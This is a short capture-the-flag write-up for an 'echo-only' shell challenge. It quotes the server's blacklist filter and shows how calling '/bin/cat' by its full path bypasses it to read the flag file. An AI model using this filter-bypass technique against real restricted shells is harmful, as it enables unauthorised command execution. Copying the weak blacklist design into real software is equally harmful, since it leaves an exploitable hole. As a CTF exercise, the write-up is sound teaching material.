## misc/really-only-echo

Hey, I have made a terminal that only uses echo, can you find the flag?  
`nc chal.competitivecyber.club 3333`

**Given:** `server.py`

## Solution

The given server says that it is a shell that only uses the `echo` command. It uses following code to filter out any other command.

```python
blacklist = os.popen("ls /bin").read().split("\n")
blacklist.remove("echo")
#print(blacklist)

def filter_check(command):
    user_input = command
    parsed = command.split()
    #Must begin with echo
    if not "echo" in parsed:
        return False
    else:
        if ">" in parsed:
            #print("HEY! No moving things around.")
            req.sendall(b"HEY! No moving things around.\n\n")
            return False
        else:
            parsed = command.replace("$", " ").replace("(", " ").replace(")", " ").replace("|"," ").replace("&", " ").replace(";"," ").replace("<"," ").replace(">"," ").replace("`"," ").split()
            #print(parsed)
            for i in range(len(parsed)):
                if parsed[i] in blacklist:
                    return False
            return True
```

The blacklist only contains binary names present in `/bin` folder. However, we can use the full path of the binary to bypass the blacklist. i.e. `/bin/cat` != `cat`. Also, we just need to have `echo` somewhere in the command.

### solve.txt
```bash
/bin/cat flag.txt echo
```

## Flag
```bash
ramenhost@ctf$ nc chal.competitivecyber.club 3333 < solve.txt 
This is shell made to use only the echo command.
Please input command: pctf{echo_is_such_a_versatile_command}
```
